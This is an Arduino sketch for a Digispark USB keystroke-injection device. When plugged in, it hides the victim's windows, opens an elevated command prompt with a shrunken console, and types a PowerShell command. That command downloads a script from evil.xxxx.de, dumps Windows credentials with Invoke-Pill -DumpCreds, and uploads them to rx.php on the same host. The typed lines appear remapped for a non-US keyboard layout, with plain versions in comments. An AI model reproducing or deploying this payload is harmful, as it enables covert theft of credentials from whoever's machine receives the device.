#include "DigiKeyboard.h"

void setup() 
{
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() 
{ 
  DigiKeyboard.update();
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT); //minimize all windows
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(500);
  // DigiKeyboard.println("powershell Start-Process cmd -Verb runAs");
  DigiKeyboard.println("powershell Start/Process cmd /Verb runAs");
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_J, MOD_ALT_LEFT); // ALT-J
  DigiKeyboard.delay(1000);
  // DigiKeyboard.println("mode con:cols=18 lines=1");
  DigiKeyboard.println("mode con>cols)18 lines)1");
  DigiKeyboard.delay(1000);
  //  DigiKeyboard.println("powershell "IEX (New-Object Net.WebClient).DownloadString('http://evil.xxxx.de/im.ps1'); $output=Invoke-Pill -DumpCreds; (New-Object Net.WebClient).UploadString('http://evil.xxxx.de/rx.php', $output)"); 
  DigiKeyboard.println("powershell @IEX *New/Object Net.WebClient (.DownloadString*|http>&&evil.xxxx.de&im.ps1|(< $output ) Invoke/Pill /DumpCreds < *New/Object Net.WebClient(.UploadString*|http>&&evil.xxxx.de&rx.php|, $output(@"); 
  DigiKeyboard.delay(15000); 
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(2000);
  digitalWrite(1, LOW); 
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(15000); 
}
